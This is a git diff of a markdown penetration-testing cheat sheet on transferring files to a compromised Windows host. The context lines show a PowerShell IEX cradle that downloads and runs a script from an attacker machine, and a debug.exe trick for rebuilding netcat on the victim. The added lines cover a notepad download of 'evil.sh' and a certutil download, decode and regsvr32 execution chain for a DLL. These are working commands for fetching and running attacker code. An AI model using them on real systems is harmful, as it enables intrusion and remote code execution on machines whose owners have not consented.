@@ -138,8 +138,6 @@ or modded script
 IEX(New-Object Net.WebClient).downloadString('http://KaliIP:8000/vulnSher.ps1')
 ```
 
-## 
-
 ## Debug.exe
 
 This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
@@ -158,15 +156,37 @@ wine exe2bat.exe nc.exe nc.txt
 
 Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe
 
-
-
 ### If you a GUI but are limited
 
-download files via notepad: 
+download files via notepad:
 
 ```
 from notepad click file->"Open" in the "File name:" field type the path to your file (ex. http://10.10.10.1/evil.sh) and click Open.
 ```
 
+## Certutil
 
+1. Create your DLL \(or file interested in transfer\)
+
+2. Base64encode it \(optional\)
+
+3. Use certutil.exe -urlcache -split -f http://example/file.txt file.blah to pull it down
+
+```
+certutil.exe -urlcache -split -f http://example/file.txt file.blah
+```
+
+4. Base64decode the file with certutil \(optional\)
+
+```
+certutil.exe -decode dll.txt mydll.dll
+```
+
+5. Execute the dll with regsvr32 
+
+```
+regsvr32 /s /u mydll.dll
+```
+
+http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
 
